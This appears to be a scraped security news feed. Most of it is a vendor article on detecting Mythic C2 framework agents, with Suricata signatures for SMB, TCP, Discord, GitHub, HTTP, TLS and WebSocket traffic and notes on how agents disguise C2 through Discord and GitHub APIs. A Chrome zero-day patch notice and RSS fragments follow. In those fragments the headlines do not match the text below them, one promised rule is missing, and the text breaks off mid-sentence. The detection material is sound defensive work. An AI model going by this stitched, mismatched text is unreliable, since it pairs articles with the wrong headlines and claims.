While they once favored closed-source frameworks, such as Cobalt Strike and Brute Ratel C4, open-source projects like Mythic, Sliver, and Havoc have surged in popularity in recent years. Malicious actors are also quick to adopt relatively new frameworks, such as Adaptix C2.Analysis of popular frameworks revealed that their development focuses heavily on evading detection by antivirus and EDR solutions, often at the expense of stealth against systems that analyze network traffic. While obfuscating an agent’s network activity is inherently challenging, agents must inevitably communicate with their command-and-control servers. Consequently, an agent’s presence in the system and its malicious actions can be detected with the help of various network-based intrusion detection systems (IDS) and, of course, Network Detection and Response (NDR) solutions.This article examines methods for detecting the Mythic framework within an infrastructure by analyzing network traffic. This framework has gained significant traction among various threat actors, including Mythic Likho (Arcane Wolf) и GOFFEE (Paper Werewolf), and continues to be used in APT and other attacks.Mythic C2 is a multi-user command and control (C&C, or C2) platform designed for managing malicious agents during complex cyberattacks. Mythic is built on a Docker container architecture, with its core components – the server, agents, and transport modules – written in Python. This architecture allows operators to add new agents, communication channels, and custom modifications on the fly.Since Mythic is a versatile tool for the attacker, from the defender’s perspective, its use can align with multiple stages of the Unified Kill Chain, as well as a large number of tactics, techniques, and procedures in the MITRE ATT&CK® framework. is a tactic where the attacker uses an already compromised system as a pivot point to gain access to other systems within the network. In this way, they gradually expand their presence within the organization’s infrastructure, bypassing firewalls, network segmentation, and other security controls. is a tactic focused on gathering and aggregating information of value to the attacker: files, credentials, screenshots, and system logs. In the context of network operations, collection is often performed locally on compromised hosts, with data then packaged for transfer. Tools like Mythic automate the discovery and selection of data sought by the adversary. is the process of moving collected information out of the secured network via legitimate or covert channels, such as HTTP(s), DNS, or SMB, etc. Attackers may use resident agents or intermediate relays (pivot hosts) to conceal the exfiltration source and route.Command and Control (TA0011) encompasses the mechanisms for establishing and maintaining a communication channel between the operator and compromised hosts to transmit commands and receive status updates. This includes direct connections, relaying through pivot hosts, and the use of covert protocols. Frameworks like Mythic provide advanced C2 capabilities, such as scheduled command execution, tunneling, and multi-channel communication, which complicate the detection and blocking of their activity.This article focuses exclusively on the Command and Control (TA0011) tactic, whose techniques can be effectively detected within the network traffic of Mythic agents.Detecting Mythic agent activity in network trafficAt the time of writing, Mythic supports data transfer over HTTP/S, WebSocket, TCP, SMB, DNS, and MQTT. The platform also boasts over a dozen different agents, written in Go, Python, and C#, designed for Windows, macOS, and Linux.Mythic employs two primary architectures for its command network:In this model, agents communicate with adjacent agents forming a chain of connections which eventually leads to a node communicating directly with the Mythic C2 server. For this purpose, agents utilize TCP and SMB.In this model, agents communicate directly with the C2 server via HTTP/S, WebSocket, MQTT, or DNS.Mythic provides pivoting capabilities via named SMB pipes and TCP sockets. To detect Mythic agent activity in P2P mode, we will examine their network traffic and create corresponding Suricata detection rules (signatures).When managing agents via the SMB protocol, a named pipe is used by default for communication, with its name matching the agent’s UUID.Although this parameter can be changed, it serves as a reliable indicator and can be easily described with a regular expression. Example:
[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}For SMB communication, agents encode and encrypt data according to the pattern: base64(UUID+AES256(JSON)). This data is then split into blocks and transmitted over the network. The screenshot below illustrates what a network session for establishing a connection between agents looks like in Wireshark.Commands and their responses are packaged within the  data structure. This structure contains three header fields, as well as the commands themselves or the corresponding responses:Number of data blocks (4 bytes)Current block number (4 bytes)The screenshot below shows an example of SMB communication between agents.The agent (10.63.101.164) sends a command to another agent in the  format. The first three Write Requests transmit the total message size, total number of blocks, and current block number. The fourth request transmits the Base64-encoded data. This is followed by a sequence of Read Requests, which are also transmitted in the  format.Below are the data transmitted in the fourth field of the  structure.The content is encoded in Base64. Upon decoding, the structure of the transmitted information becomes visible: it begins with the UUID of the infected host, followed by a data block encrypted using AES-256.The fact that the data starts with a UUID string can be leveraged to create a signature-based detection rule that searches network packets for the identifier pattern.To search for packets containing a UUID, the following signature can be applied. It uses specific request types and protocol flags as filters (Command: Ioctl (11), Function: FSCTL_PIPE_WAIT), followed by a check to see if the pipe name matches the UUID pattern.alert tcp any any -> any [139, 445] (msg: "Trojan.Mythic.SMB.C&C"; flow: to_server, established; content: "|fe|SMB"; offset: 4; depth: 4; content: "|0b 00|"; distance: 8; within: 2; content: "|18 00 11 00|"; distance: 48; within: 12; pcre: "/\x48\x00\x00\x00[\x00-\xFF]{2}([a-z0-9]\x00){8}\-\x00([a-z0-9]\x00){4}\-\x00([a-z0-9]\x00){4}\-\x00([a-z0-9]\x00){4}\-\x00([a-z0-9]\x00){12}$/R"; threshold: type both, track by_src, count 1, seconds 60; reference: url, https://github.com/MythicC2Profiles/smb; classtype: ndr1; sid: 9000101; rev: 1;)
Agent activity can also be detected by analyzing data transmitted in SMB  packets with the protocol flag  and a distinct packet structure where the  and  fields are set to zero. If the Data field is Base64-encoded and, after decoding, begins with a UUID-formatted string, this indicates a command-and-control channel.alert tcp any any -> any [139, 445] (msg: "Trojan.Mythic.SMB.C&C"; flow: to_server, established; dsize: > 360; content: "|fe|SMB"; offset: 4; depth: 4; content: "|09 00|"; distance: 8; within: 2; content: "|00 00 00 00 00 00 00 00 00 00 00 00|"; distance: 86; within: 12; base64_decode: bytes 64, offset 0, relative; base64_data; pcre: "/^[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}/"; threshold: type both, track by_src, count 1, seconds 60; reference: url, https://github.com/MythicC2Profiles/smb; classtype: ndr1; sid: 9000102; rev: 1;)
Below is the KATA NDR user interface displaying an alert about detecting a Mythic agent operating in P2P mode over SMB. In this instance, the first rule – which checks the request type, protocol flags, and the UUID pattern – was triggered.It should be noted that these signatures have a limitation. If the SMBv3 protocol with encryption enabled is used, Mythic agent activity cannot be detected with signature-based methods. A possible alternative is behavioral analysis. However, in this context, it suffers from low accuracy and a high false-positive rate. The SMB protocol is widely used by organizations for various legitimate purposes, making it difficult to isolate behavioral patterns that definitively indicate malicious activity.Mythic also supports P2P communications via TCP. The connection initialization process appears in network traffic as follows:As with SMB, the  structure is used for transmitting and receiving data. First, the data length (4 bytes) is sent as a big-endian DWORD in a separate packet. Subsequent packets transmit the number of data blocks, the current block number, and the data itself. However, unlike SMB packets, the value of the current block number field is always 0x00000000, due to TCP’s built-in packet fragmentation support.The data encoding scheme is also analogous to what we observed with SMB and appears as follows: base64(UUID+AES256(JSON)). Below is an example of a network packet containing Mythic data.The decoded data appears as follows:Similar to communication via SMB, signature-based detection rules can be created for TCP traffic to identify Mythic agent activity by searching for packets containing UUID-formatted strings. Below are two Suricata detection rules. The first rule is a utility rule. It does not generate security alerts but instead tags the TCP session with an internal flag, which is then checked by another rule. The second rule verifies the flag and applies filters to confirm that the current packet is being analyzed at the beginning of a network session. It then decodes the Base64 data and searches the resulting content for a UUID-formatted string.alert tcp any any -> any any (msg: "Trojan.Mythic.TCP.C&C"; flow: from_server, established; dsize: 4; stream_size: server, <, 6; stream_size: client, <, 3; content: "|00 00|"; depth: 2; pcre: "/^\x00\x00[\x00-\x5C]{1}[\x00-\xFF]{1}$/"; flowbits: set, mythic_tcp_p2p_msg_len; flowbits: noalert; threshold: type both, track by_src, count 1, seconds 60; reference: url, https://github.com/MythicC2Profiles/tcp; classtype: ndr1; sid: 9000103; rev: 1;)

Below is the NDR interface displaying an example of the two rules detecting a Mythic agent operating in P2P mode over TCP.For stealthy operations, Mythic allows agents to be managed through popular services. This makes its activity less conspicuous within network traffic. Mythic includes transport modules based on the following services:Of these, only the first two remain relevant at the time of writing. Communication via Slack (the Slack C2 Profile transport module) is no longer supported by the developers and is considered deprecated, so we will not examine it further.The Discord C2 Profile transport moduleThe use of the Discord service as a mediator for C2 communication within the Mythic framework has been gaining popularity recently. In this scenario, agent traffic is indistinguishable from normal Discord activity, with commands and their execution results masquerading as messages and file attachments. Communication with the server occurs over HTTPS and is encrypted with TLS. Therefore, detecting Mythic traffic requires decrypting this.Analyzing decrypted TLS trafficLet’s assume we are using an NDR platform in conjunction with a network traffic decryption (TLS inspection) system to detect suspicious network activity. In this case, we operate under the assumption that we can decrypt all TLS traffic. Let’s examine possible detection rules for that scenario.Agent and server communication occurs via Discord API calls to send messages to a specific channel. Communication between the agent and Mythic uses the MythicMessageWrapper structure, which contains the following fields:message: the transmitted datasender_id: a GUID generated by the agent, included in every messageto_server: a direction flag – a message intended for the server or the agentOf particular interest to us is the  field, which contains the transmitted data encoded in Base64. The MythicMessageWrapper message is transmitted in plaintext, making it accessible to anyone with read permissions for messages on the Discord server.Below is an example of data transmission via messages in a Discord channel.To establish a connection, the agent authenticates to the Discord server via the API call /api/v10/gateway/bot. We observe the following data in the network traffic:After successful initialization, the agent gains the ability to receive and respond to commands. To create a message in the channel, the agent makes a POST request to the API endpoint /channels/<channel.id>/messages. The network traffic for this call is shown in the screenshot below.After decoding the Base64, the content of the message field appears as follows:A structure characteristic of a UUID is visible at the beginning of the packet.After processing the message, the agent deletes it from the channel via a DELETE request to the API endpoint /channels/{channel.id}/messages/{message.id}.Below is a Suricata rule that detects the agent’s Discord-based communication activity. It checks the API activity for creating HTTP messages for the presence of Base64-encoded data containing the agent’s UUID.alert tcp any any -> any any (msg: "Trojan.Mythic.HTTP.C&C"; flow: to_server, established; content: "POST"; http_method; content: "/api/"; http_uri; content: "/channels/"; distance: 0; http_uri; pcre: "/\/messages$/U"; content: "|7b 22|content|22|"; depth: 20; http_client_body; content: "|22|sender_id"; depth: 1500; http_client_body; pcre: "/\x22sender_id\x5c\x22\x3a\x5c\x22[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}/"; threshold: type both, track by_src, count 1, seconds 60; reference: url, https://github.com/MythicC2Profiles/discord; classtype: ndr1; sid: 9000105; rev: 1;)
Below is the NDR user interface displaying an example of detecting the activity of the Discord C2 Profile transport module for a Mythic agent within decrypted HTTP traffic.Analyzing encrypted TLS trafficIf Discord usage is permitted on the network and there is no capability to decrypt traffic, it becomes nearly impossible to detect agent activity. In this scenario, behavioral analysis of requests to the Discord server may prove useful. Below is network traffic showing frequent TLS connections to the Discord server, which could indicate commands being sent to an agent.In this case, we can use a Suricata rule to detect the frequent TLS sessions with Discord servers:alert tcp any any -> any any (msg: "NetTool.PossibleMythicDiscordEgress.TLS.C&C"; flow: to_server, established; tls_sni; content: "discord.com"; nocase; threshold: type both, track by_src, count 4, seconds 420; reference: url, https://github.com/MythicC2Profiles/discord; classtype: ndr3; sid: 9000106; rev: 1;)
Another method for detecting these communications involves tracking multiple DNS queries to the discord.com domain.The following rule can be applied to detect these:alert udp any any -> any 53 (msg: "NetTool.PossibleMythicDiscordEgress.DNS.C&C"; content: "|01 00 00 01 00 00 00 00 00 00|"; depth: 10; offset: 2; content: "|07|discord|03|com|00|"; nocase; distance: 0; threshold: type both, track by_src, count 4, seconds 60; reference: url, https://github.com/MythicC2Profiles/discord; classtype: ndr3; sid: 9000107; rev: 1;)
Below is the NDR user interface showing an example of a custom rule in operation, detecting the activity of the Discord C2 Profile transport module for a Mythic agent within encrypted traffic based on characteristic DNS queries.The proposed rule options have low accuracy and can generate a high number of false positives. Therefore, they must be adapted to the specific characteristics of the infrastructure in which they will run.  and  parameters, which control the triggering frequency and time window, require tuning.GitHub C2 Profile transport moduleGitHub’s popularity has made it an attractive choice as a mediator for managing Mythic agents. The core concept is the same as in other covert Egress communication transport modules. Communication with GitHub utilizes HTTPS. Successful operation requires an account on the target platform and the ability to communicate via API calls. The transport module utilizes the GitHub API to send comments to pre-created Issues and to commit files to a branch within a repository controlled by the attackers. In this model, the agent interacts only with GitHub: it creates and reads comments, uploads files, and manages branches. It does not communicate with any other servers. The communication algorithm via GitHub is as follows:The agent posts a comment (check-in) to a designated Issue on GitHub, intended for agents to report their results.The Mythic server validates the comment, deletes it, and posts a reply in an issue designated for server use.The agent creates a branch with a name matching its UUID and writes a get_tasking file to it (performs a push request).The Mythic server reads the file and writes a response file to the same branch.The agent reads the response file, deletes the branch, pauses, and repeats the cycle.Analyzing decrypted TLS trafficLet’s consider an approach to detecting agent activity when traffic decryption is possible.Agent communication with the server utilizes API calls to GitHub. The payload is encoded in Base64 and published in plaintext; therefore, anyone who can view the repository or analyze the traffic contents can decode it.Analysis of agent communication revealed that the most useful traffic for creating detection rules is associated with publishing check-in comments, creating a branch, and publishing a file.During the check-in phase, the agent posts a comment to register a new agent and establish communication.The transmitted data is encoded in Base64 and contains the agent’s UUID and the portion of the message encrypted using AES-256.This allows for a signature that detects UUID-formatted substrings within GitHub comment creation requests.alert tcp any any -> any any (msg: "Trojan.Mythic.HTTP.C&C"; flow: to_server, established; content: "POST"; http_method; content: "api.github.com"; http_host; content: "/repos/"; depth: 8; http_uri; pcre: "/\/comments$/U"; content: "|22|body|22|"; depth: 8; http_client_body; base64_decode: bytes 300, offset 2, relative; base64_data; pcre: "/^[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}/"; threshold: type both, track by_src, count 1, seconds 60; reference: url, https://github.com/MythicC2Profiles/github; classtype: ndr1; sid: 9000108; rev: 1;)
Another stage suitable for detection is when the agent creates a separate branch with its UUID as the name. All subsequent relevant communication with the server will occur within this branch. Here is an example of a branch creation request:Therefore, we can create a detection rule to identify UUID-formatted strings within branch creation requests.alert tcp any any -> any any (msg: "Trojan.Mythic.HTTP.C&C"; flow: to_server, established; content: "POST"; http_method; content: "api.github.com"; http_host; content: "/repos/"; depth: 100; http_uri; content: "/git/refs"; distance: 0; http_uri; content: "|22|ref|22 3a|"; depth: 10; http_client_body; content: "refs/heads/"; distance: 0; within: 50; http_client_body; pcre: "/refs\/heads\/[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}\x22/"; threshold: type both, track by_src, count 1, seconds 60; reference: url, https://github.com/MythicC2Profiles/github; classtype: ndr1; sid: 9000109; rev: 1;)
After creating the branch, the agent writes a file to it (sends a push request), which contains Base64-encoded data.Therefore, we can create a rule to trigger on file publication requests to a branch whose name matches the UUID pattern.alert tcp any any -> any any (msg: "Trojan.Mythic.HTTP.C&C"; flow: to_server, established; content: "PUT"; http_method; content: "api.github.com"; http_host; content: "/repos/"; depth:8; http_uri; content: "/contents/"; distance: 0; http_uri; content: "|22|content|22|"; depth: 100; http_client_body; pcre: "/\x22message\x22\x3a\x22[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}\x22/"; threshold: type both, track by_src, count 1, seconds 60; reference: url, https://github.com/MythicC2Profiles/github; classtype: ndr1; sid: 9000110; rev: 1;)
The screenshot below shows how the NDR solution logs all suspicious communications using the GitHub API and subsequently identifies the Mythic agent’s activity. The result is an alert with the verdict Trojan.Mythic.HTTP.C&C.Analyzing encrypted TLS trafficCommunication with GitHub occurs over HTTPS; therefore, in the absence of traffic decryption capability, signature-based methods for detecting agent activity cannot be applied. Let’s consider a behavioral agent activity detection approach.For instance, it is possible to detect connections to GitHub servers that are atypical in frequency and purpose, originating from network segments where this activity is not expected. The screenshot below shows an example of an agent’s multiple TLS sessions. The traffic reflects the execution of several commands, as well as idle time, manifested as constant polling of the server while awaiting new tasks.Multiple TLS sessions with the GitHub service from uncharacteristic network segments can be detected using the rule presented below:alert tcp any any -> any any (msg:"NetTool.PossibleMythicGitHubEgress.TLS.C&C"; flow: to_server, established; tls_sni; content: "api.github.com"; nocase; threshold: type both, track by_src, count 4, seconds 60; reference: url, https://github.com/MythicC2Profiles/github; classtype: ndr3; sid: 9000111; rev: 1;)Additionally, multiple DNS queries to the service can be logged in the traffic.This activity is detected with the help of the following rule:alert udp any any -> any 53 (msg: "NetTool.PossibleMythicGitHubEgress.DNS.C&C"; content: "|01 00 00 01 00 00 00 00 00 00|"; depth: 10; offset: 2; content: "|03|api|06|github|03|com|00|"; nocase; distance: 0; threshold: type both, track by_src, count 12, seconds 180; reference: url, https://github.com/MythicC2Profiles/github; classtype: ndr3; sid: 9000112; rev: 1;)
The screenshot below shows the NDR interface with an example of the first rule in action, detecting traces of the GitHub profile activity for a Mythic agent within encrypted TLS traffic.The suggested rule options can produce false positives, so to improve their effectiveness, they must be adapted to the specific characteristics of the infrastructure in which they will run. The parameters of the  keyword – specifically the  and  values, which control the number of events required to generate an alert and the time window for their occurrence in NDR – must be configured.The Egress communication model allows agents to interact directly with the C2 server via the following protocols:The first two protocols are the most prevalent. The DNS-based transport module is still under development, and the module based on MQTT sees little use among operators. We will not examine them within the scope of this article.HTTP is the most common protocol for building a Mythic agent control network. The HTTP transport container acts as a proxy between the agents and the Mythic server. It allows data to be transmitted in both plaintext and encrypted form. Crucially, the metadata is not encrypted, which enables the creation of signature-based detection rules.Below is an example of unencrypted Mythic network traffic over HTTP. During a GET request, data encoded in Base64 is passed in the value of the  parameter.After decoding, the agent’s UUID – generated according to a specific pattern – becomes visible. This identifier is followed by a JSON object containing the key parameters of the host, collected by the agent.If data encryption is applied, the network traffic for agent communication appears as shown in the screenshot below.After decrypting the traffic and decoding from Base64, the communication data reveals the familiar structure: UUID+AES256(JSON).Therefore, to create a detection signature for this case, we can also rely on the presence of a UUID within the Base64-encoded data in POST requests.alert tcp any any -> any any (msg: "Trojan.Mythic.HTTP.C&C"; flow: to_server, established; content: "POST"; http_method; content: "|0D 0A 0D 0A|"; base64_decode: bytes 80, offset 0, relative; base64_data; content: "-"; offset: 8; depth: 1; content: "-"; distance: 4; within: 1; content: "-"; distance: 4; within: 1; content: "-"; distance: 4; within: 1; pcre: "/[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}/"; threshold: type both, track by_src, count 1, seconds 180; reference: md5, 6ef89ccee639b4df42eaf273af8b5ffd; classtype: trojan1; sid: 9000113; rev: 2;)
The screenshot below shows how the NDR platform detects agent communication with the server over HTTP, generating an alert with the name Trojan.Mythic.HTTP.C&C.Mythic agents can communicate with the server via HTTPS using the corresponding transport module. In this case, data is encrypted with TLS and is not amenable to signature-based analysis. However, the activity of Mythic agents can be detected if they use the default SSL certificate. Below is an example of network traffic from a Mythic agent with such a certificate.For this purpose, the following signature is applied:alert tcp any any -> any any (msg:"Trojan.Mythic.TLS.C&C"; flow:established, from_server; content:"|16 03|"; depth:2; content:"|0B|"; distance:3; within:1; content:"|55 04|"; distance:0; content:"|09|Mythic C2"; nocase; distance:0; threshold:type both,track by_src,count 1,seconds 60; reference:url,github.com/its-a-feature/Mythic; classtype:ndr1; sid:9000114; rev:1;)The WebSocket protocol enables full-duplex communication between a client and a remote host. Mythic can utilize it for agent management.The process of agent communication with the server via WebSocket is as follows:The agent sends a request to the WebSocket container to change the protocol for the HTTP(S) connection.The agent and the WebSocket container switch to WebSocket to send and receive messages.The agent sends a message to the WebSocket container requesting tasks from the Mythic container.The WebSocket container forwards the request to the Mythic container.The Mythic container returns the tasks to the WebSocket container.The WebSocket container forwards these tasks to the agent.It is worth mentioning that in this communication model, both the WebSocket container and the Mythic container reside on the Mythic server. Below is a screenshot of the initial agent connection to the server.An analysis of the TCP session shows that the actual data is transmitted in the  field in Base64 encoding.Decoding reveals the familiar data structure: UUID+AES256(JSON).Therefore, we can use an approach similar to those discussed above to detect agent activity. The signature should rely on the UUID string at the beginning of the data field. The rule first verifies that the session data matches the data:base64 format, then decodes the  field and searches for a string matching the UUID pattern.alert tcp any any -> any any (msg: "Trojan.Mythic.WebSocket.C&C"; flow: established, from_server; content: "|7B 22|data|22 3a 22|"; depth: 14; pcre: "/^[0-9a-zA-Z\/\+]+[=]{0,2}\x22\x7D\x0A$/R"; content: "|7B 22|data|22 3a 22|"; depth: 14; base64_decode: bytes 48, offset 0, relative; base64_data; pcre: "/^[a-z0-9]{8}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{4}\-[a-z0-9]{12}/i"; threshold: type both, track by_src, count 1, seconds 30; reference: url, https://github.com/MythicAgents/; classtype: ndr1; sid: 9000115; rev: 2;)
Below is the Trojan.Mythic.WebSocket.C&C signature triggering on Mythic agent communication over WebSocket.The Mythic post-exploitation framework continues to gain popularity and evolve rapidly. New agents are emerging, designed for covert persistence within target infrastructures. Despite this evolution, the various implementations of network communication in Mythic share many common characteristics that remain largely consistent over time. This consistency enables IDS/NDR solutions to effectively detect the framework’s agent activity through network traffic analysis.Mythic supports a wide array of agent management options utilizing several network protocols. Our analysis of agent communications across these protocols revealed that agent activity can be detected by searching for specific data patterns within network traffic. The primary detection criterion involves tracking UUID strings in specific positions within Base64-encoded transmitted data. However, while the general approach to detecting agent activity is similar across protocols, each requires protocol-specific filters. Consequently, creating a single, universal signature for detecting Mythic agents in network traffic is challenging; individual detection rules must be crafted for each protocol. This article has provided signatures that are included in Kaspersky NDR.Kaspersky NDR is designed to identify current threats within network infrastructures. It enables the detection of all popular post-exploitation frameworks based on their characteristic traffic patterns. Since the network components of these frameworks change infrequently, employing an NDR solution ensures high effectiveness in agent discovery.Kaspersky verdicts in Kaspersky solutions (Kaspersky Anti-Targeted Attack with NDR module and Kaspersky NGFW)Trojan.Mythic.SMB.C&C

The patch fixes three flaws in Chrome, and for one of them Google says an exploit already exists in the wild.Chrome is by far the world’s most popular browser, with an estimated 3.4 billion users, that makes for a massive target. When Chrome has a security flaw that can be triggered just by visiting a website, billions of users are exposed until they update.That’s why it’s important to install these patches promptly. Staying unpatched means you could be at risk just by browsing the web. Attackers often exploit these kinds of flaws before most users have a chance to update. Always let Chrome update itself, and don’t delay restarting it as updates usually fix exactly this kind of risk.The latest version number is  for Windows and macOS, and for Linux. So, if your Chrome is on version  it’s protected from these vulnerabilities.The easiest way to update is to allow Chrome to update automatically, but you can end up lagging behind if you never close your browser or if something goes wrong—such as an extension stopping you from updating the browser.To update manually, click the  menu (three dots), then go to  > . If an update is available, Chrome will start downloading it. Restart Chrome to complete the update, and you’ll be protected against these vulnerabilities.2025 exploited zero-days in ChromePublic reporting indicates that Chrome has seen at least seven zero-days exploited in 2025, several of them in the V8 JavaScript engine and some linked to targeted espionage.So, 2025 has been a relatively busy year for Chrome zero‑days. In March, a sandbox escape tracked as CVE‑2025‑2783 showed up in espionage operations against Russian targets. And with the November update, Google patched CVE-2025-13223, reported by Google’s Threat Analysis Group (TAG), which focuses on spyware and nation-state attackers who regularly use zero-days for espionage.The latest security advisory mentions a vulnerability that has not yet received a CVE ID but is referred to as 466192044. Google states it is aware that an exploit for 466192044 exists in the wild.If we’re lucky, this update will close out 2025’s run of Chrome zero-days. We will keep you posted if we find out more about the nature of the latest zero-day vulnerability.“466192044” is now tracked as CVE-2025-14174: out of bounds memory access in ANGLE in Google Chrome on Mac prior to 143.0.7499.110 allowed a remote attacker to perform out of bounds memory access via a crafted HTML page. CISA has added the vulnerability to their list of known exploited vulnerabilities.ANGLE is used as the default Web Graphics Library backend for both Google Chrome and Mozilla Firefox on Windows platforms. Chrome uses ANGLE for all graphics rendering on Windows.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>The Impact of Robotic Process Automation (RPA) on Identity and Access Management</title><link>https://thehackernews.com/2025/12/the-impact-of-robotic-process.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkHa_ZsEZyIsKJkBKWhgZBt2Oo3VGKY_5ZeOaoO74V_TbabWN-GlLYtOPjpjnqS63ufmXSWt2jnwRglhgFqzJTGGHqOO04K3wn6V3lN6IJdsNupy7M1V9yKe5895zGyjmnme7207WatecL_hIzgwWMYo5AvT3ecXh7PYHwDCAZw5NjY5iDiIFWkzO7pmw/s1600/keeper.jpg" length="" type=""/><pubDate>Thu, 11 Dec 2025 11:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[As enterprises refine their strategies for handling Non-Human Identities (NHIs), Robotic Process Automation (RPA) has become a powerful tool for streamlining operations and enhancing security.

Many organizations deploy them without password changes, patch cycles, or network segmentation. Attackers notice. Because MFPs are attached to networks and can carry sensitive data, compromise can enable credential theft, data leakage, and lateral movement within the network. The report tracks how long-standing and emerging weaknesses continue to affect MFP security. It highlights common risk areas such as weak authentication and limited patching practices, among others, that leave devices open to misuse or compromise. As these printers have grown more connected and feature-rich, the potential impact of a single vulnerable device has increased, especially when linked to core business systems or identity services.The study also examines broader exposure trends across the enterprise landscape. Thousands of MFPs remain directly accessible from the internet, and vulnerability data shows that many models have faced serious flaws in recent years. Beyond technical issues, organizational processes like inconsistent patch management and poor decommissioning practices often allow sensitive data and credentials to linger on devices long after their use.Penetration testing data collected by Rapid7 and Raxis confirms that these risks are not theoretical. Many organizations still deploy MFPs with default settings, leaving them open to credential theft and data access that can help attackers move deeper into the network.The report introduces Praeda-II, a community tool designed for pentesters, auditors, and IT teams who need fast visibility into vulnerable printers, to identify risks in MFPs across modern models.]]></content:encoded></item><item><title>Unpatched Gogs Zero-Day Exploited Across 700+ Instances Amid Active Attacks</title><link>https://thehackernews.com/2025/12/unpatched-gogs-zero-day-exploited.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6OJVsDspcCdye7M8PSggWU392C8E30egOw45ke_JjhGPAv-Au_u34ejTw7mT307EGecNF77LcAz2Kzw6Mhyphenhyphenhjl956WA2poNcT3kP3eIhMKjv3vqDJabkLtachFO7EPl-c8ROOH771RwuVd5KPhSBTSS10wG1qKhLRNxDLtLF59V4G1hvD2dn3LZrHCmBU/s1600/gg.jpg" length="" type=""/><pubDate>Thu, 11 Dec 2025 10:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A high-severity unpatched security vulnerability in Gogs has come under active exploitation, with more than 700 compromised instances accessible over the internet, according to new findings from Wiz.

International tensions and the strategic calculations of major cyber powers, including Russia, China, Iran, and North Korea, significantly shape the current threat landscape. Businesses can no longer operate as isolated entities; they now function as interconnected global ecosystems where employees, suppliers, cloud workloads, supply chains, and data flows intersect across multiple jurisdictions, each with its own unique set of political risks. A region considered low-risk last month could become a high-risk zone overnight if a diplomatic dispute escalates. An overseas development team could suddenly become vulnerable if that region experiences sanctions, stricter regulations, or state pressure on the workforce. Many organizations still underestimate this dynamic reality, relying on static risk models that assume relatively stable attack patterns. However, geopolitical decisions and internal vulnerabilities are often the drivers of the most sudden and consequential changes in exposure. For example, the announcement of sanctions can trigger retaliatory cyberattacks, a military buildup can unleash destructive campaigns, and a trade or intellectual property dispute can lead to large-scale espionage. Cybersecurity leaders must therefore integrate geopolitical intelligence directly into their operational decision-making and risk assessment processes, recognizing that political forces, rather than technical errors, are often the primary trigger for increased vulnerability.Geopolitics as a core driver of cyber riskGeopolitics plays a decisive role in shaping the scale, direction, and sophistication of cybercriminal and state-sponsored activity, fundamentally altering the threat landscape for organizations worldwide. Geopolitical tensions and sanctions often create conditions in which state-aligned hackers operate with greater freedom, using cyber operations as tools for espionage, economic survival, political retaliation, or strategic influence. Isolated or sanctioned states often turn to cybercrime as an alternative source of revenue. North Korea, for instance, intensifies financially motivated campaigns, including cryptocurrency theft and extortion, when economic pressure mounts. Iran, facing recurring sanctions and political isolation, tends to respond with retaliatory or disruptive cyber operations targeting sectors and institutions associated with adversarial nations.  China’s cyber activity often peaks during moments of heightened competition over technology and strategic resources, driving expansive espionage campaigns aimed at industries like aerospace, telecommunications, AI, and energy. Russia, meanwhile, escalates disruptive or destructive cyber actions during geopolitical confrontations or military conflicts, leveraging malware, industrial system interference, and coordinated information operations. These patterns demonstrate how cyber risk extends far beyond technical vulnerabilities: organizations become targets because of their nationality, sector, technology assets, or global partnerships. How geopolitical tensions influence threat actor behaviorGeopolitical tensions influence the behavior of threat actors by altering their objectives, aggression levels, and operational trade-offs in ways that directly impact global organizations. Russian groups, for example, will shift from covert intelligence collection to overt disruption, employing destructive malware, DDoS attacks, and infrastructure sabotage to exert pressure. Chinese actors are known to intensify long-term espionage and supply-chain infiltration, targeting IP, cloud providers, security firms, and development environments.Iran responds to sanctions or regional tensions with opportunistic retaliation through data wiping, defacements, and financially motivated attacks. And when facing economic strain, North Korea expands cybercrime, including cryptocurrency theft, extortion, software supply-chain poisoning, and high-level financial fraud.For organizations, these shifts manifest internally as newly observed attack patterns, such as targeted phishing aimed at political or strategic sectors, the exploitation of vulnerabilities relevant to conflicts, or supply-chain attacks aligned with espionage objectives. The unifying pattern is that geopolitical tensions cause attackers to reprioritize, whereby espionage becomes a means of destruction, revenue generation becomes a national strategy, and symbolic retaliation becomes an operational necessity. Security teams that do not account for these geopolitical triggers risk misjudging the scale, intent, and urgency of incoming threat campaigns.Indicators that cyber escalation is comingA cyber escalation is rarely an isolated phenomenon; it is usually accompanied by political and technical warning signs that can herald a wave of attacks. On the political front, organizations should monitor events such as sanctions announcements, diplomatic expulsions, military mobilizations, sudden breakdowns in negotiations, strategic military strikes, or public accusations of espionage. For example, tensions with Russia are often followed by cyber influence campaigns. Retaliatory cyberattacks are also common following the imposition of sanctions on the Islamic Republic of Iran. Increased cyber espionage campaigns coincide with periods of strategic competition with China, and financially motivated attacks intensify after economic pressure is exerted on North Korea. On a technical level, the first warning signs manifest in one or more of the following ways: An increase in sector-specific phishing attacks linked to political eventsThe reactivation of known command and control infrastructuresThe formation of new politically-motivated hacktivist collectivesAccess intermediaries launching campaigns to sell access points in sectors linked to ongoing conflictsInternally, organizations may sometimes observe unusual activity from cybersecurity teams, such as unexpected code updates from maintenance managers located in politically sensitive regions, vendor outages correlated with geopolitical developments, or authentication anomalies linked to regions near ongoing crises. The most important pattern to recognize is convergence: when political escalation, external surveillance, and internal anomalies appear within the same time frame, organizations must assume that threat conditions have shifted from background noise to active risk and 